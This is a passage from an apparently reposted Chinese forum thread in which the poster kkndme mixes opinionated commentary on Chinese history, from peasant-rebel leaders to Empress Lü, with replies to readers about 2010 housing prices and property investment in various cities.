<p>古代能够夺取天下的，基本都是贵族阶层，有野心有理想有知识。最典型的就是李世民。汉高祖刘邦同样不是单纯的流氓无产者，他幸运的娶了吕雉，一跃成为地主家族的一员。</p>
<p>历史上只有朱元璋是个异数。这也是毛为什么要推崇朱的原因。</p>
<h2 id="郑州有前景"><a href="#郑州有前景" class="headerlink" title="郑州有前景"></a>郑州有前景</h2><blockquote>
<p><strong>larryzs：</strong></p>
<p>最喜欢看楼主评说历史了</p>
<p>呵呵，看来历史要重新好好读一下了</p>
<p>不知道楼主对河南郑州的房价了解吗？</p>
<p>希望楼主对郑州将来的发展分析一下。</p>
<p>现在郑州的房价均价也差不多快到6000了，郑东新区的一万以上。</p>
<p>市政府也在大力修建地铁，个人认为还是有发展前景的。</p>
<p><strong>kkndme：</strong></p>
<p>郑州的交通区位决定了经济发展的空间，同意你的说法，很有前景</p>
</blockquote>
<h2 id="公园地产是稀缺资源"><a href="#公园地产是稀缺资源" class="headerlink" title="公园地产是稀缺资源"></a>公园地产是稀缺资源</h2><blockquote>
<p><strong>klid：</strong></p>
<p>LZ，省会城市二环边公园边房产和市中心无天然气房产，选择哪个比较好？</p>
<p><strong>kkndme：</strong></p>
<p>公园地产未来是稀缺资源，市中心虽好，但是没有天然气毕竟不方便。两者相较还是公园边合适。</p>
</blockquote>
<h2 id="张献忠屠川"><a href="#张献忠屠川" class="headerlink" title="张献忠屠川"></a>张献忠屠川</h2><p>关于张献忠屠四川，尽管学术上存在争议，但大致是不差的，虽不见于正史，但《蜀碧》及《求幸福斋随笔》都有记录。很多学者也做了大量的考证。</p>
<p>张献忠此人曾经读过书，做过zf最基层公务员——捕快，但是被开除了。人格比较扭曲，不但好色，且好杀成性，是典型的流氓无产者。大明的苦难子民指望这样的有严重心理疾病的杀人狂拯救，那是毫无指望的。</p>
<p>张献忠每攻城略地特别喜欢把当地的妇女同志送进军营当营妓，并且乐此不疲，军队没粮了，就把美丽的少女切成块做成腊肉。把儿童成群的围起来用火烧，谁往外跑就用刀刺，也是张大义军领袖最喜欢的游戏。</p>
<p>对于张的行为，我们只能用有严重的心理疾病来解释。</p>
<p>一个仇视社会的愤青，掌握了军队，破坏力是相当可怕的，是人民的灾难。</p>
<p>张攻陷四川建立大西国政权，与柬埔寨的红色高棉政权简直是异曲同工。以至于清军进入四川受到了百姓的欢迎而不是抵抗。这跟越南入侵柬埔寨，越南军受到了柬埔寨人民的欢迎是多么相似啊。</p>
<p>人民的眼睛是雪亮的，违反人性的，即使打着爱国的旗号，也终将被人民抛弃。</p>
<h2 id="洪秀全、黄巢、李自成"><a href="#洪秀全、黄巢、李自成" class="headerlink" title="洪秀全、黄巢、李自成"></a>洪秀全、黄巢、李自成</h2><p>洪秀全同志，人生比较悲剧，人家好歹是个落地秀才。洪教主考了20多年，连个秀才都没考上，相当于小学都没毕业。</p>
<p>洪教主考试不行，搞邪教确是个高手，夜里做梦居然梦见上帝（形象大概是个白胡子老道）说洪教主是他的二儿子。这个梦确实不太靠谱。很可能是洪教主有意编的。</p>
<p>洪教主的拜上帝教应该算是白莲教的一支或者说是余孽。</p>
<p>洪教主搞革命，对解放劳苦大众却一点不感冒，最感兴趣的是一夫多妻制，娶了88个后妃。好像历史上的农民军领袖对妇女同志都有出奇好感，大概是小时候性压抑的结果。</p>
<p>太平天国攻下南京得了半壁江山，洪教主从41岁开始，直到11年后自杀，竟然没出南京城一步。大概是收罗的漂亮的妇女同志太多了，实在没有时间干别的。</p>
<p>比起张大义军领袖的变态，洪教主还是比较有人性。好色，人之天性。</p>
<p>不过洪教主进南京，并没有因为女性的爱情滋润，而让他变得温柔。虽然没有张大领袖变态，实行的也是三光政策：杀光、烧光、抢光。</p>
<p>“凡掳之人，每视其人之手，如掌心红润，十指无重茧者，恒指为妖，或一见即杀，或问答后杀，或不胜刑掠自承为妖杀，或竞捶楚以死。”大意是手上没长茧子的就是妖人，就要统统杀掉。</p>
<p>农民起义带来的不是均田地等贵贱的乌托邦，而是血腥恐怖</p>
<p>说起洪教主玩弄的美女确实让人流口水，除了88个妃子外，女官侍婢不计其数，算下来用了11年时间玩了2300名妇女。</p>
<p>有一本《江南春梦笔记》：王后娘娘下辖爱娘、嬉娘、妙女、姣女等16个名位共208人；24个王妃名下辖姹女、元女等七个名位共960人，两者共计1169人。以上都属嫔妃，都是要和洪秀全同床共枕的。天王府不设太监，所以另外还有许多服役的“女官”。以二品掌率60人各辖女司20人计算，合计为1200人。各项人数加起来，总计有2300多名妇女在天王府陪侍洪秀全一个人。</p>
<p>一个农民当了教主，就有这样的眼福。换做了傻空当教主，会怎么做？</p>
<p>黄巢比洪教主学问要高一些，但是屡试不第，当了私盐贩子。</p>
<p>从起义的第一天开始，黄巢的脑子里也从来没有过百姓该如何如何的。</p>
<p>他是一个彻头彻尾的投机分子，说是义军，不如说是强盗。</p>
<p>新唐书中说，贼军所过州县，老百姓皆烧杀殆尽。黄巢的兵可并不懂三大纪律八项注意，那是能抢救抢，抢不了就烧就杀。</p>
<p>无论是旧唐书、新唐书、还是资治通鉴，从头到尾，就没有出现过黄巢的一句好话。</p>
<p>黄巢攻陷广州，至少屠杀了十二万人，把皇帝气晕了。</p>
<p>皇帝还知道体恤子民呢，而黄巢就是彻头彻尾的强盗外加杀人犯。</p>
<p>黄巢攻进长安当了天子，充分显现了流氓无产者的本质，穷奢极欲，挥霍无度，治理国家的事彷佛就跟他没有一点关系。不搞建设就只能做吃山空，结果长安的粮食都被糟蹋完了。</p>
<p>长安没有余粮，黄巢就把长安老百姓抓来，煮着吃，十万大军靠吃老百姓过日子。</p>
<p>幸好老天开眼，官军打进了长安，结果是老百姓对官军夹道欢迎。<br>农民军真是义军吗？</p>
<p>不但中国的农民军领袖都是杀人魔鬼的化身，就是法国资产阶级大革命领袖罗伯斯皮尔，同样也是法西斯暴政的先驱者。最后被人民送上了断头台。</p>
<p>只有一个真正的法制化国家，人民在法律的制约下，享有人身与财产自由，才能够安居乐业。</p>
<p>李自成在军队纪律上，是要比张献忠高明一点的，所以李自成打进了北京。李自成到北京后，拷贝了黄巢进长安的淫乐经验，对美女极尽淫乱之能事，对百姓烧杀抢劫做的也很出色。</p>
<p>历代农民军对妇女的态度与《水浒传》中梁山好汉完全相反。</p>
<p>施耐庵笔下的梁山好汉们似乎对妇女有天生的仇视，动不动就把女同志劈死，李逵甚至终生不尽女色，就凭这一点，我们只能说梁山好汉是农民军中的异类。</p>
<p>但是梁山好汉不是为了起义，而是为了招安。一群由小公务员和渔民组成的社会最底层群众梦想通过拉山头再跳槽的方式走进金字塔的中层，但是这个梦想破灭了。</p>
<p>古代历史上，能够治理天下的穷苦人，只有一个：朱元璋。</p>
<h2 id="朱元璋"><a href="#朱元璋" class="headerlink" title="朱元璋"></a>朱元璋</h2><p>为什么朱元璋可以，而别人不可以。</p>
<p>经过仔细研究发现，朱元璋的人生际遇不像黄巢、张献忠和李自成，他有点像刘邦，但又有很大区别。</p>
<p>朱元璋是一个到处要饭吃的和尚，但是喜欢思考，见世面，交朋友，并且找到了自己的宗教信仰——明教（也叫摩尼教、白莲教）。</p>
<p>朱元璋走投无路投奔起义军的时候，娶了起义军濠州大帅郭子兴的义女当老婆，就是那个著名的马皇后。郭子兴并不是一个农民，而是一个大地主，所以朱元璋加入的这个新家族，思想完全不同一个扛着扁担造反的农民。</p>
<p>郭子兴作为农民军的统帅，却在逛街的路上，被其他的农民军兄弟（真正的农民）绑了票，大概是因为农民对地主阶级比较仇恨。最后被朱元璋救了出来。</p>
<p>郭子兴看见朱元璋比自己强，反而起了憎恨之心，一心想把朱元璋弄死。</p>
<p>朱元璋在丰富的人生经历中看到了农民起义军领袖们的鼠目寸光，要想成大事，必须有远大的理想和抱负，而这些是黄巢、张献忠、李自成、洪秀全都没有的。</p>
<p>朱元璋与那些个农民军领袖最大的不同在于，他熟读历史，因此他把汉高祖刘邦作为榜样。目标是建立一个基业长青的强大统一的国家。</p>
<p>朱元璋就懂得无论是得到天下，还是治理天下，就必须有能力的人来辅佐。嫉贤妒能的人只能被历史的车轮碾碎。</p>
<h2 id="曹参治国"><a href="#曹参治国" class="headerlink" title="曹参治国"></a>曹参治国</h2><p>人们最希望的，就是在一个良好的社会环境下，安居乐业，自食其力。zf的职责就是健全法制，维护一个良好的环境，剩下的事，交给民间去做。三天两头出政策，过度插手百姓如何过日子，甚至朝令夕改，就会让百姓的正常生产生活无所适从。<br>早在汉朝初期，曹参已经参悟了这个道理。<br>曹参是刘邦当亭长时的领导，也是刘邦最亲密的战友。萧何是文官，曹参则是武将，曾经在韩信麾下效力，除了披坚执锐外，最重要的工作就是监视韩信，防止韩大军事家谋反。<br>这样一个万夫难敌的勇将，却在革命胜利后被分配给齐王刘肥（刘邦的私生子）当相国，主抓齐国的政务。</p>
<p>曹参是一介武夫，只懂得军事，并不懂治理地方，就用厚礼聘请了精通黄老之术的盖公。盖公认为：治理国家很简单，只要按照律法办事，给老百姓提供一个安全的稳定的环境，其他的都不用管，官府千万不要好大喜功，追求政绩，过多插手百姓的事物，顺其自然就好了。<br>曹参很赏识盖公，并且按照盖公的话去做，九年的时间，齐国变得非常繁荣。<br>这时候，传来噩耗，萧何挂了，皇帝刘盈聘请曹参出任相国。曹参上任以后，几乎罢免了所有办事效率高、口才好，有追求有抱负的能吏，提拔了一群只知道按部就班，照章办事的老实巴交的官员，然后就彻底大松心，成天喝酒吃肉听小曲。</p>
<p>很多人对曹参不满就给皇帝刘盈打小报告，刘盈的表现是很愤怒。<br>曹参就问刘盈：是陛下你牛呢，还是先皇刘邦牛呢？<br>刘盈：当然是先皇牛<br>曹参又问：那我跟萧何比，谁牛呢？<br>刘盈愤怒的说：你比萧何差远了。<br>曹参做了个总结：您讲的太对了，先皇和萧相国拟定的法令已经非常清楚了，只要贯彻执行下去就好，我只要按照他们的法令办，不就行了吗？<br>刘盈虽然不事朝政，但应该算是比较聪明的君主，一听就懂：对于已经定下的治国方针大略，只要执行下去，一定会使人民休养生息，国家富足。如果大搞政绩工程，对于先皇刚死，吕后掌权时期风雨飘摇的大汉来说，将是灾难性的。<br>民间把成天喝酒吃肉听小曲的曹参称为贤相。司马迁在史记中也给了曹参极高的评价。</p>
<p>假设一个工程队要盖楼房，起初设计人员设计了20层，刚盖了两层，队长换人了，非要盖成30层，工人于是绞尽脑汁费劲办法改造。等盖到25层的时候，又换队长了，新队长说还是改成两层的别墅吧。刚把楼房都拆掉，别墅建了一半，又来了一个队长，说要建成比迪拜塔还高的大塔楼。这个楼建了n年也没建起来。<br>建房子跟治国的道理是一样的，我国汉代的相国曹参就已经明白了这个道理。</p>
<h2 id="晁错"><a href="#晁错" class="headerlink" title="晁错"></a>晁错</h2><p>刚才有人提到吴楚七国之乱，讲得是晁错。晁错其人是很值得讲讲的，一个有才能的人在错误的时间做了一个理论上正确的事，却导致吴楚七国之乱，汉景帝差点完蛋。结果是景帝砍了晁错的脑袋。</p>
<p>这个故事，几乎家喻户晓，蕴藏的道理却很深，大家如果懒得看史料，有兴趣可以参看易中天“帝国的惆怅”，还是很值得一看的</p>
<h2 id="民营小企业的老板和打工者"><a href="#民营小企业的老板和打工者" class="headerlink" title="民营小企业的老板和打工者"></a>民营小企业的老板和打工者</h2><p>糊涂人即使把道理说的再浅显，他也听不明白，呵呵。<br>现在我国已经进入高通胀期，但是地方巨额债务与人民币的升值又封杀了加息的空间，经济形式有可能恶化，民营小企业的老板和打工者只能自求多福了。</p>
<blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>刚查了一下央行的数据，8月份的M2是68.75万亿，我没记错的话，7月份的M2控制的很好，基本没怎么涨，但是到了8月份，没想到有那么猛的涨幅，看来不到12月，我国的M2就要到70万亿了。2007年1月份，我国的货币供应量是35万亿。</p>
<p>今早去小摊买早点，原来一块五的加鸡蛋灌饼现在卖两块。如果涨工资，只会把通胀越推越高，如果不涨工资，P民就要忍受通胀的剥削。真是无语了</p>
</blockquote>
<h2 id="郭解"><a href="#郭解" class="headerlink" title="郭解"></a>郭解</h2><p>从古到今，小老百姓遇到不公，受了委屈，幻想最多的就是跳出一个大侠，劫富济贫，为自己伸张正义。所以金庸的小说广为流传，被称为成年人的童话。<br>我国古代，真有大侠，不过古代的大侠并不是会降龙十八掌的郭靖，也不是小李飞刀，而是黑帮的老大，相当于西方的教父。<br>最有名的大侠叫郭解，汉朝时有极高的威望，不然也不会写进史记。<br>郭解的爸爸是个职业杀手，非常有名，用古龙的话说，最厉害的杀手是没有名字的，郭解的老爸名声太大，注定活不长。有个米商请郭解的老爸到监狱里救出犯了法的儿子，郭老爸看在钱的份上去了，就再也没能回来。</p>
<p>郭解跟他老爸学过功夫，很有两下子，于是干起了抢劫和盗墓的这份很有前途的职业。因为功夫高，谁只要说句话让他不爱听，必然遭遇一顿暴打。本着流氓会武术谁也挡不住的精神，到了三十岁，郭解已经钱多的数不过来了。男怕入错行，女怕嫁错郎，看来抢劫和盗墓的职业选择对了。<br>30岁以后，郭解为了从强盗升级为教父，开始积累自己的名声，并且学习战国四公子，开始蓄养门客，但凡是哪个人有难，有求必应。俨然形成了一个严密的黑社会组织。在民间的声望，甚至超过了皇帝。<br>皇帝的权威是不容冒犯的，一个地方黑社会头子怎么能够这么嚣张呢？就把郭解抓了起来，虽然有大量的证据证明郭解作奸犯科草菅人命，但都是汉武帝大赦前的事情，没有办法定罪。汉武帝一筹莫展，人抓了不能定罪，又不能放掉，该怎么办呢？<br>这时，正好有个书生，骂郭解不遵纪守法。正巧被郭解的门客听到了，就把那个书生给杀了。<br>汉武帝听了哈哈大笑，正巧找这个理由把郭解灭族。<br>侠客的黄金时代，从此结束</p>
<p>剑侠情侣，快意江湖，听着是一个充满了浪漫的世界，而事实是完全不可取，一个没有法制的社会，奉行者赤裸裸的丛林法则，什么是对？什么又是错？理由就永远站在强者一边，强者可以随自己的意愿决定弱者的生死。<br>这个社会是可怕的。<br>郭解，就让他永远埋葬吧</p>
<h2 id="2010年的中国房地产"><a href="#2010年的中国房地产" class="headerlink" title="2010年的中国房地产"></a>2010年的中国房地产</h2><blockquote>
<p><strong>汝爱之罪：</strong></p>
<p>今天跟家里人打电话，姨妈说了下近一年来老家云南东北方向一个地级市曲靖的变化。</p>
<p>主要就是：好些有资金的外地大佬大手笔拿地，开发酒店和商品房。都是市区的黄金地段。</p>
<p>其实房地产开发在中国的任何一个城市每天都在发生，不过令人感慨的是这样的“四线”城市也如此火爆，购买力之强令人感慨，她说最近几天曲靖正在举行房交会，人头攒动。<br>现在老百姓有钱都向往好的房子和户型了，已经不满足90年代的老旧房子了，而且通货膨胀也逼得大家不得不置业保值。</p>
<p>再回头看看北京，简直找不到跌的理由。那么多地铁要修，那么多优质生源每年涌向北京高校，那么多人口，每天要造就那么多富人。。。。</p>
<p><strong>kkndme：</strong></p>
<p>钱太多了，流动性泛滥，老百姓恐慌了。这次调控暂时抑制了一线城市房价的上涨势头，但是却直接导致了全国性房价的上涨，不光二三线城市，连四级以下城市都是如此。这就是领导水平。</p>
</blockquote>
<h2 id="精英人群的平均收入决定房价"><a href="#精英人群的平均收入决定房价" class="headerlink" title="精英人群的平均收入决定房价"></a>精英人群的平均收入决定房价</h2><blockquote>
<p><strong>skysurfer2208：</strong></p>
<p>想请教一下楼主，对于很多的二线城市，比如武汉，市区房子的均价一万左右了，但当地的平均收入一般也就3000左右吧，难倒你不认为现在的房价里面有泡沫吗？特别是现在正处在调控期，对于我们这些近年打算买房的来说，是在等等看呢还是在在这个时期出手？多谢楼主</p>
<p><strong>kkndme：</strong></p>
<p>你所说的平均收入是什么概念？是人人都挣3000块，还是有人挣2000块，有人挣1万块。武汉的房价，要看湖北省包括各地市的人口，家庭收入上万的人有多少，如果你认为很少，几乎没有，那房价肯定存在泡沫。如果湖北省有20%的人口家庭月收入超过万元，那么武汉市区的房价就没有泡沫。</p>
</blockquote>
<h2 id="内地不是香港、海南"><a href="#内地不是香港、海南" class="headerlink" title="内地不是香港、海南"></a>内地不是香港、海南</h2><p><strong>johny__：</strong></p>
<p>那香港97年的时候还不是一样跌了一大截，按LZ的说法，1）土地资源很稀缺；2）作为消费群体的白领收入也能买房；3）作为世界城市，更是汇聚了世界级精英的购买力，仿佛现在上海。最后，不是一样大跌？？中产都成了负资产了。就连林百欣的儿子林建岳97年以69亿港元高价购入中环富丽华，还不是赔得一塌糊涂。</p>
<p>楼价涨高了就要跌，哪都不例外，这个才是规律。什么通涨，精英购买力决定房价，都是涨了之后在找理由。</p>
<p><strong>kkndme：</strong></p>
<p>这就是体制上的不同啊，所以我们无法重复香港和日本。97年的金融风暴，还是中国以国家之力对抗索罗斯的量子基金，保住了香港，这种行为在西方国家是难以想象的。一个国家动用全国人民的外汇储备与美国的民间资本打一场战争，这是令全世界震惊的。索罗斯因为不了解中国的体制，悻悻而归。</p>
<p>人民币不能在世界流通，依照我国实行的货币制度，货币只不过是一种符号。如果有一天我们的人民币能够自由兑换，香港发生的事也一定会发生在我们身上，但你认为我们的人民币能够自由兑换吗？</p>
<p><strong>johny__：</strong></p>
<p>那92年的海南崩盘有从何说起？从7000多掉到了几百元，这难道是海南体制？发币行是海南银行？同样是国内，同样的外汇管理制度，不是日本也不是香港，是中国海南。</p>
<p>–据《中国房地产市场年鉴（1996）》统计，1988年，海南商品房平均价格为1350元&#x2F;平方米，1991年为1400元&#x2F;平方米，1992年猛涨至5000元&#x2F;平方米，1993年达到7500元&#x2F;平方米的顶峰。短短三年，增长超过4倍。</p>
<p>–海峡对岸的北海，沉淀资金甚至高达200亿元，烂尾楼面积超过了三亚，被称为中国的“泡沫经济博物馆”。</p>
<p>[经验交流]92年海南房地产泡沫始自于“击鼓传花”(转载)<br><a href="http://www.tianya.cn/publicforum/content/house/1/163988.shtml">http://www.tianya.cn/publicforum/content/house/1/163988.shtml</a></p>
<p><strong>kkndme：</strong></p>
<p>全国的资金去炒海南、北海，炒的纯粹是概念，没有实体的支撑，就是一种博傻游戏。今年年初海南房地产的爆炒，同样积聚了巨大的风险。买房并不是全无风险，好比通州、燕郊，经历疯狂的炒作一定会理性的回归。但是如果指望北京四环内房价下跌，也只是痴心妄想。</p>
<p>房产投资也不是随便买套房就只涨不跌，比如说山东乳山的房子，开发商疯狂炒作旅游地产概念，但如果真的想投资升值，那就成了天大的笑话，因为根本无法变现。</p>
<p>什么样的房产适合投资，投资者不是傻子，都会有理性的判断。</p>
<p>90年代初的强硬调控让海南和北海的经济崩盘，对全国来说不可怕，毕竟只是一隅之地，但是如果用粗暴手段搞崩了全国，zf一定会好好掂量的。</p>
<h2 id="历史是一面镜子"><a href="#历史是一面镜子" class="headerlink" title="历史是一面镜子"></a>历史是一面镜子</h2><p>如果以为本帖讲的历史故事，那就完全理解错了。<br>本帖讲得不是历史，而是总结前人的经验，讲得是故事背后的道理。<br>如果毛不是熟读历史，也不可能取得胜利。毛在进京的时候，说过一句话：我们不学李自成。<br>只有认真总结过李自成失败的教训，才能够做出正确的选择。</p>
<h2 id="买房一次性到位比较好"><a href="#买房一次性到位比较好" class="headerlink" title="买房一次性到位比较好"></a>买房一次性到位比较好</h2><blockquote>
<p><strong>包容会通：</strong></p>
<p>我老婆是长春人,岳父母退休,都有退休金.我和我老婆现在都在国外,准备3年以后回长春工作,我们现在有40万的现金,放在银行也没什么用,也担心3年以后,长春的房价还要涨.</p>
<p>因此,现在准备用其中的20万作首付买套70平的小户型的,让岳父母住(岳父母有住房,但很快就要拆迁了).等3年以后回长春,把这套小的卖了换成大的.不知这样的计划是否可行?贷款如何弄?<br>　　　　　　　　<br>谢谢兄弟.</p>
<p><strong>kkndme：</strong></p>
<p>既然是自住型需求，何不买套大点的，70平（建筑面积）的房子无论是自住、父母住还是合住，都比较拥挤。既然有40万的闲钱，还是一次到位比较好，3年后长春的房价一定要比现在高的多。</p>
<p>只是贷款比较麻烦，你的父母是无法贷款的，除非你们夫妻能够回国，这种事用别人的名字办肯定是不行的，房价上涨后就有可能会陷入扯皮甚至打官司的境地。</p>
</blockquote>
<h2 id="外汇管制"><a href="#外汇管制" class="headerlink" title="外汇管制"></a>外汇管制</h2><blockquote>
<p><strong>tianxiaobing11：</strong></p>
<p>楼主，这个tj连人民币不能自由兑换都不知道，可见他的水平也太差了，就不用和他计较了，从上个月开始人民币换美圆好象收紧了，是怕民众把人民币换美圆出逃吗？</p>
<p><strong>kkndme：</strong></p>
<p>外汇外流趋势比较严重，zf开始严管，包括携带50美元以上商品入境必须征税等措施，都是限制外汇外流。富人从穷人身上赚了钱，换成美元在国外消费，这是zf不愿意看到的，zf不在意富人搜刮穷人，但肉一定要烂在锅里</p>
</blockquote>
<h2 id="一线和二线"><a href="#一线和二线" class="headerlink" title="一线和二线"></a>一线和二线</h2><blockquote>
<p><strong>yamazaki28：</strong></p>
<p>楼主好，小弟有问题请教，本人所在二线省会城市，存款40w,近来看中本市CBD区域高端住住宅一套，各方面条件十分优越，面积100左右，均价18000。但通过观察，又看中觉得北京五环附近的待建地铁房，均价16000，想贷款弄小户型60左右，不知哪个升值潜力大，本人已有房一套。谢楼主指点。</p>
<p><strong>kkndme：</strong></p>
<p>短期来看，二三线城市的房产升值速度要高于北京，这是这次调控造成的结果，从长期来看，北京房产的升值速度要高于二三线城市。五环附近地铁房，还是很有优势的。</p>
</blockquote>
<h2 id="吕后篡权"><a href="#吕后篡权" class="headerlink" title="吕后篡权"></a>吕后篡权</h2><p>大凡是60年代末，70年代初生人，小时候肯定看过一本小人书：吕后篡权。<br>在那个时代推出这本书，很有寓意，起到了很好的宣传效果。<br>吕后真的是十恶不赦的妖妇吗？让我们还原历史的真相。<br>我们读到的吕雉，通常的形象是蛇蝎心肠的女强人。<br>大家感兴趣的，首先是关于吕雉在项羽大营和审食其是否有一腿。<br>然后看到的是吕雉协助刘邦诛杀异性王、与倾国倾城的戚夫人争宠、帮助儿子刘盈与戚夫人的儿子刘如意争夺太子、杀害戚夫人和刘如意、提拔吕氏家族成员。<br>但是因为宣传的需要，几乎所有人都忽略了吕雉的另一面</p>
<p>刘邦见上帝以后，吕雉掌权期间，对待老百姓还是很够意思的。<br>俗话说嫁出的女就是泼出去的水。吕雉可不同，吕雉非常照顾自己的娘家人，想把自己的娘家人都提拔起来。<br>秦始皇把分封制改成郡县制，搞天下大一统，意识比较超前，结果政权不稳定，秦朝很短时间就完蛋了。高祖刘邦吸取了这个教训，仍然搞分封制，不过分封制做了重大的改革:首先是分封的诸侯王必须是皇族，也就是说必须姓刘。其次是从中央派丞相给诸侯王，丞相掌握诸侯国的军政大权，防止生变。<br>吕雉提拔娘家干部最大的障碍就是：高祖说过，诸侯王只能姓刘。</p>
<p>吕雉是一个极其精明的女人，她追尊自己的老爹吕公为宣王，吕公是刘邦的老岳父，追尊皇帝的老岳父，旁人自不能有异议。既然有了先例，剩下的事就好办了，吕雉趁机把自己吕姓家族的成员封为吕王。<br>吕王吕嘉这个人很嚣张，仗着外戚的身份，飞扬跋扈，不尊法纪。<br>吕雉是一个出色的国家领导人，不是黄巢李自成之类的强盗流民，是很关心民生的，所以很生气，把吕嘉给废了，让吕嘉的叔叔吕产当吕王。<br>吕雉掌权后，做了很多亲民的好事，减免老百姓的税赋，加强建设健康的人民文化娱乐，最受百姓欢迎的是废除了“三族罪”和“妖言令”。<br>三族罪的意思很直白，就是一人犯罪株连三族。<br>妖言令有点象后来的文字狱，哪里出现统治者认为的妖言，就把那个地方的所有百姓全部处死。这是一个伟大的历史进步。<br>吕雉还是女权运动的先驱者，在吕雉时代，女子也可以封官封侯，可以随意离婚再嫁。那个时代是中国古代史上，女人最幸福的时代之一。<br>吕雉，一个柔弱的女子，在残酷的宫廷政治斗争中表现的异常凶狠，然而权力的斗争本身就是你死我活，在治国方面，吕雉却无愧于一个贤明的统治者，可谓巾帼不让须眉。吕雉与后来的老佛爷完全就不是一个等级，毫无可比性。<br>吕雉执掌朝政十五年，直到病死后，吕氏家族才土崩瓦解。<br>还原真实的历史，我们不应该对这位叱诧风云的女政治家，致以深深的敬意吗？</p>
<h2 id="小产权房"><a href="#小产权房" class="headerlink" title="小产权房"></a>小产权房</h2><blockquote>
<p><strong>大水牛跟水牛仔：</strong></p>
<p>楼主,可以谈谈小产权房的看法吗?父母是珠海的原居民且拥有两套小产权房,无房产证只有村里所发的使用证,是村委会卖给原居民的,离市中心约半小时车程,近河边,而一路之隔的位置己建有大型高尚住宅小区,在售价一万二以上,请问这些小产权房可靠吗?听说往后政府对这些小产权房采取放宽政策,只需补一点钱就可改成商品房,你觉得有可能吗?</p>
<p><strong>kkndme：</strong></p>
<p>这个补点钱就改商品房的可能性不大，如果是大片的小产权房，拆的可能性也不大。这个问题很让zf头痛，城乡双轨制的结果，所以zf能拖就拖。</p>
<p>但是对于片区不大的小产权房，风险就很大</p>
<p><strong>大水牛跟水牛仔：</strong></p>
<p>谢谢楼主回复,父母手上的两套小产权房在同一小区,小区比较大,这类小区有好几个,由于村内将进行旧村改造,规划成高级住宅片区,那此类小产权房如遭迁拆的话会得到赔偿吗?</p>
<p><strong>kkndme：</strong></p>
<p>这个会比较扯皮，最坏的情况是按照原价退赔，最好的情况是回迁安置。如果原价退赔损失就很大。</p>
</blockquote>
<h2 id="商铺和住宅"><a href="#商铺和住宅" class="headerlink" title="商铺和住宅"></a>商铺和住宅</h2><blockquote>
<p><strong>deeplp：</strong></p>
<p>kkndme 兄，你好。</p>
<p>从这个帖子一开始就一只跟着，每天必看。受益良多。</p>
<p>你对广州感觉如何？请教一个问题，不知你对商铺是否有研究？你觉得眼下投资商铺好呢，还是继续投资房产。<br>本人已有2套房产，都在广州市区且近地铁但不带很好学位。现有如下两个想法，</p>
<ol>
<li>分散投资，投资一个商铺，目前看中一个广州北京路拐弯处二楼商铺一个，靠近地铁。</li>
<li>继续房产，买一个130以上大户型且带学位房，方便以后小孩读书。（计划明年要小孩，现在就做打算是怕以后买不起阿。）<br>麻烦兄台给些意见。十分感谢。</li>
</ol>
<p><strong>kkndme：</strong></p>
<p>找到合适的商铺是很难的，因为商铺投资风险大，所以非常考验个人的眼光，属于高风险高回报，找对了，将财源滚滚，找错了很可能血本无归。<br>如果你有眼光，首选商铺。如果不具备这方面的能力投资住宅比较保险。</p>
</blockquote>
<h2 id="体制内外"><a href="#体制内外" class="headerlink" title="体制内外"></a>体制内外</h2><p><strong>tuzi1976：</strong></p>
<p>kkndme兄，你好。上周提了几个问题，可能你没看到，再请教一次，请抽空指点一二。<br>看到楼主说过“人民币对外是升值，对内贬值”，我认识到“人民币对外是升值，对内贬值”这一点也有一年多了吧，主要是从生活经历、经济新闻中得到的结论（本人学工科、不懂经济）。虽然看到了表面现象，但对其发生的根本原因、对群众生活的深刻影响、“中产阶级（勉强算是有这么个阶级）”的应对之策等等尚没有深刻的认识。楼主看到我提的这些问题恐怕也觉得范围太大、难以回答？难道体制外的“中产阶级”只有任人宰割、移民海外、钻营往上爬这几个选择？诚心求教，风险自担（呵呵，楼主也不是神仙）</p>
<p><strong>kkndme：</strong></p>
<p>普天之下莫非王土，决定了今天的土地国有<br>万般皆下品，也决定了以后知识分子的前途必须进入体制内。<br>不能考中进士的明清两代知识分子，即使经商发了大财，也一样让人看不起，不能光宗耀祖。今天的知识分子将面临同样的命运。<br>体制外，凭个人的本事和运气，自生自灭。</p>
<h2 id="2010年的上海"><a href="#2010年的上海" class="headerlink" title="2010年的上海"></a>2010年的上海</h2><blockquote>
<p><strong>youme5845：</strong></p>
<p>看到LZ的帖子真是太及时了！因为要解决小孩子上学，我最近开始密集型的看房子.</p>
<p>感慨房价高的同时后悔没有早点考虑买房。头痛啊！！！</p>
<p>说说我们的情况：目前现金40W,家庭收入1W5,住上海，目前看的房子为周边世纪公园地铁10分钟老公房(新房很少)，81P 190W,地段很好，但房子都是95年左右的了。算下来除了首付家里帮助外每个月供5K还30年(扣除公积金还款),我们现在可以出手么？还是等十一新政策出来后买？</p>
<p>还是在交通稍微不便的地方买低价的房子？</p>
<p>请LZ给个意见~ 在线等~<br>多谢！！！！</p>
<p><strong>kkndme：</strong></p>
<p>月供5k,收入1万5，说明的你的压力不大，完全可以承受。如果地段好，可以不考虑房子的新旧。一线城市的买房时机最不好拿捏，因为一线城市是调控的目标，你要仔细观察，如果发现中介的铺面里看房客越来越多，建议赶紧下手。</p>
<p><strong>youme5845：</strong></p>
<p>多谢！！！ 那我最近关注多一些！<br>还有这块小区同时是学区房，是否可以买个100W出头的出租，然后自己租房住(我们长期租住房租很便宜 1700两室户)，这样即使以后出现金融危机等情况也不会担太大风险，是这样么？</p>
<p><strong>kkndme：</strong></p>
<p>对自己好一点的就会自己住，对钱看的比较重，可以买房出租，自己租便宜的。因人的性格而已。<br>不过人生苦短，在短短的有生之年，还是要对自己好一点。自己买的房子住起来跟租房子的感觉是完全不同的。</p>
</blockquote>
<h2 id="买房：物业与房贷"><a href="#买房：物业与房贷" class="headerlink" title="买房：物业与房贷"></a>买房：物业与房贷</h2><blockquote>
<p><strong>fallenleafe：</strong></p>
